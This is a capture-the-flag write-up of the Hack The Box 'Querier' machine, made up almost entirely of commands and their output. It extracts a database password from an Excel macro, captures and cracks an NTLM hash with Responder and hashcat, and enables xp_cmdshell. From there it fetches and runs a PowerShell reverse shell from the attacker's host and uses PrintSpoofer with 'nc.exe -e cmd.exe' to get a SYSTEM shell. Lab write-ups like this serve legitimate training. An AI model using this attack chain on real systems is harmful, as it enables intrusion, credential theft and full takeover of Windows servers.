# Querier

## Foothold

```
┌──[Fri Nov  4 09:23:39 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting/oscp]
└──# rscan $ip
rustscan --accessible -u 5000 -b 2500 -a 10.129.13.248 -- -Pn -A
...
445/tcp   open  microsoft-ds? syn-ack ttl 127
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-05T02:18:23
| Not valid after:  2052-11-05T02:18:23
| MD5:   1235 aeb5 ea06 e940 43b9 2917 71a6 7456
| SHA-1: f006 c6d8 6ba7 347c 959a 404a 4eff cfd0 29d9 424b
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQf/RgQSiAZJlApNwnsBmSWDANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjIxMTA1MDIxODIzWhgPMjA1MjExMDUwMjE4MjNaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOt9dxE5
| LNCjq7f1mx7rCuT64mA7TTxVac/OcqA9kh5Gk+ZkH8FK8zobQEe85VAxxbfWF7Yd
| oH/8u4lRTZ2YSEelNCn9a6h5t+5W70vjCWVoSyjhCXPwyH059gcWlCx34piVuhVs
| 6xt3NRRY2qi1YmTejgDpZAOcNcpM1gBVY2kTgfmADW2M1RxIB2enVIl0nJpQc9ME
| fCl0cElzekM2ewfq8LN8LypOth6FpCa00b4u88+VA4uYG6Iw21hMsDDUawcxvDKI
| otETen6tYoVcoW1VKIj/qXyu1w4NfH8PQzhs2J5PVFiuY6pB6FnPc8UbZFOG1lJY
| wae1r4z1xZ4nK/ECAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAET8jUB3Z13oBJJta
| Z86zy1vefdAPtEg6OaNX83EFtJvXh0XBY/CPECGSmH+yviLm87KTgs1DYJdrvXSq
| Xr5jLJDKL1nf9wg4cG24ocR2a+K7fBX3RfqBallJYyhdTDPycqYlop3IXWgkdIb9
| VA7VFcvO7Q06Oe+oecG7U9lu7Old4Z/2zkTkRSf7u/SxHNTNkpjxHTaAbg+BDEwL
| /FxYpUjkgQsa3nS6DoKL07p61+SyFrZ8+2uWrxr/EVUmg5vbPhq0BXVcwRFj0BKf
| znDtR5bMiN3vQIB2wOvCjqlH7NOWlUxtAionyzMB75G/o1CbNe9LiLKRK7dEgl+u
| 916RTA==
|_-----END CERTIFICATE-----
|_ssl-date: 2022-11-05T02:25:03+00:00; -1s from scanner time.
...
```

```
┌──[Fri Nov  4 11:08:20 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/opt]
└──# smbclient -N -L //$ip/reports

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk
```

```
┌──[Fri Nov  4 11:30:17 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp]
└──# smbclient -N //$ip/reports
smb: \> mget *
Get file Currency Volume Report.xlsm? y
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (20.1 KiloBytes/sec) (average 20.1 KiloBytes/sec)
```

```
┌──[Fri Nov  4 11:43:24 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp/report]
└──# unzip Currency\ Volume\ Report.xlsm 
Archive:  Currency Volume Report.xlsm
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/vbaProject.bin       
  inflating: docProps/core.xml       
  inflating: docProps/app.xml
```

```
┌──[Fri Nov  4 11:57:20 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp/report/xl]
└──# strings vbaProject.bin
 macro to pull data for client volume reports
n.Conn]
Open 
rver=<
SELECT * FROM volume;
word>
 MsgBox "connection successful"
Set rs = conn.Execute("SELECT * @@version;")
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
...
```

```
┌──[Sat Nov  5 12:17:22 AM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp/report/xl]
└──# /opt/Responder-3.1.3.0/Responder.py -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
...
[+] Listening for events...
```

```
┌──[Sat Nov  5 12:13:00 AM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp]
└──# mssqlclient.py reporting@$ip -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> exec xp_dirtree '\\10.10.16.2\share\',1,1
subdirectory                                                                                                                                                                                                                                                            depth          file   

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------   -----------   

SQL> exit
```

```
[SMB] NTLMv2-SSP Client   : 10.129.13.248
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:5e0e30237fdcb215:6966C8CD41CCD821A7686EA3575F454E:0101000000000000809815FBABF0D801074BD07C4B2F8FB900000000020008003400480042004D0001001E00570049004E002D0051004A00520053005600500041004D0049003900560004003400570049004E002D0051004A00520053005600500041004D004900390056002E003400480042004D002E004C004F00430041004C00030014003400480042004D002E004C004F00430041004C00050014003400480042004D002E004C004F00430041004C0007000800809815FBABF0D80106000400020000000800300030000000000000000000000000300000289CB1AE9150018EB14C694EA581C2691E3718EA27AD27D2CA122143625866E40A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003200000000000000000000000000
```

```
┌──[Sat Nov  5 12:29:46 AM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp/report]
└──# hashcat -d 2 hash.txt -m 5600 --wordlist /usr/share/wordlists/rockyou.txt        
...
MSSQL-SVC::QUERIER:5e0e30237fdcb215:6966c8cd41ccd821a7686ea3575f454e:0101000000000000809815fbabf0d801074bd07c4b2f8fb900000000020008003400480042004d0001001e00570049004e002d0051004a00520053005600500041004d0049003900560004003400570049004e002d0051004a00520053005600500041004d004900390056002e003400480042004d002e004c004f00430041004c00030014003400480042004d002e004c004f00430041004c00050014003400480042004d002e004c004f00430041004c0007000800809815fbabf0d80106000400020000000800300030000000000000000000000000300000289cb1ae9150018eb14c694ea581c2691e3718ea27ad27d2ca122143625866e40a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003200000000000000000000000000:corporate568
```

```
┌──[Sat Nov  5 03:18:20 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp]
└──# mssqlclient.py mssql-svc:corporate568@$ip -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> select IS_SRVROLEMEMBER ('sysadmin')
              

-----------   

          1   

SQL> sp_configure 'show advanced options', '1'
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
SQL> sp_configure 'xp_cmdshell', '1'
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
SQL> EXEC master..xp_cmdshell 'whoami'
output                                                                                                                                                                                                                                                            

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   

querier\mssql-svc                                                                                                                                                                                                                                                 

NULL                                                                                                                                                                                                                                                              
```

```
┌──[Sat Nov  5 06:15:15 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting/hackthebox]
└──# tail /opt/winreconpack/Invoke-PowerShellTcp.ps1
...
Invoke-PowerShellTcp -Reverse -IPAddress "10.10.16.2" -Port "443"
```

```
┌──[Sat Nov  5 04:01:42 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting]
└──# python3 -m http.server 80 -d /opt/winreconpack
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
┌──[Sat Nov  5 04:00:22 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester]
└──# nc -lnvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
```

```
SQL> xp_cmdshell powershell iex(new-object net.webclient).downloadstring(\"http://10.10.16.2/Invoke-PowerShellTcp.ps1\")
```

```
┌──[Sat Nov  5 04:01:42 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting]
└──# python3 -m http.server 80 -d /opt/winreconpack
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.13.248 - - [05/Nov/2022 16:01:53] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

```
┌──[Sat Nov  5 04:00:22 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester]
└──# nc -lnvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.13.248.
Ncat: Connection from 10.129.13.248:49682.
Windows PowerShell running as user mssql-svc on QUERIER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```

## User Proof

```
PS C:\Users\mssql-svc\desktop> hostname; whoami; type user.txt; ipconfig /all
QUERIER
querier\mssql-svc
e5a83e2156a73b18c9af8ca26728468e

Windows IP Configuration

   Host Name . . . . . . . . . . . . : QUERIER
   Primary Dns Suffix  . . . . . . . : HTB.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : HTB.LOCAL
                                       htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-A0-AC
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::186(Preferred) 
   Lease Obtained. . . . . . . . . . : Saturday, November 5, 2022 2:18:09 AM
   Lease Expires . . . . . . . . . . : Sunday, November 6, 2022 2:18:28 AM
   IPv6 Address. . . . . . . . . . . : dead:beef::8cc1:dc7e:539:ac36(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::8cc1:dc7e:539:ac36%13(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.129.13.248(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Saturday, November 5, 2022 2:18:09 AM
   Lease Expires . . . . . . . . . . : Sunday, November 6, 2022 2:18:30 AM
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%13
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 369119318
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-F7-80-38-00-50-56-B9-A0-AC
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb
PS C:\Users\mssql-svc\desktop>
```

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption><p>user.txt</p></figcaption></figure>

## Privilege Escalation

```
PS C:\Windows\system32> systeminfo

Host Name:                 QUERIER
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
...
System Type:               x64-based PC
...
```

```
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
...
```

```
PS C:\Windows\system32> net use \\10.10.16.2\winreconpack /user:smbuser smbuser
The command completed successfully.
```

```
PS C:\ProgramData> copy \\10.10.16.2\winreconpack\printspoofer.exe
```

```
PS C:\ProgramData> copy \\10.10.16.2\winreconpack\nc.exe
```

```
┌──[Sat Nov  5 04:38:51 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp]
└──# nc -lnvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
```

```
PS C:\ProgramData> .\printspoofer.exe -c "C:\programdata\nc.exe 10.10.16.2 443 -e cmd.exe" -i
```

```
┌──[Sat Nov  5 04:38:51 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/tmp]
└──# nc -lnvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.13.248.
Ncat: Connection from 10.129.13.248:49689.
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Root Proof

```
C:\Users\Administrator\Desktop>hostname && whoami && type root.txt && ipconfig /all
hostname && whoami && type root.txt && ipconfig /all
QUERIER
nt authority\system
d4c1de8448a7a44efc9f25d87d6d44e3

Windows IP Configuration

   Host Name . . . . . . . . . . . . : QUERIER
   Primary Dns Suffix  . . . . . . . : HTB.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : HTB.LOCAL
                                       htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-A0-AC
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::186(Preferred) 
   Lease Obtained. . . . . . . . . . : Saturday, November 5, 2022 2:18:09 AM
   Lease Expires . . . . . . . . . . : Saturday, November 5, 2022 11:18:28 PM
   IPv6 Address. . . . . . . . . . . : dead:beef::8cc1:dc7e:539:ac36(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::8cc1:dc7e:539:ac36%13(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.129.13.248(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Saturday, November 5, 2022 2:18:09 AM
   Lease Expires . . . . . . . . . . : Saturday, November 5, 2022 11:18:30 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%13
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 369119318
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-F7-80-38-00-50-56-B9-A0-AC
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb

C:\Users\Administrator\Desktop>
```

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p>root.txt</p></figcaption></figure>

## Badge

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
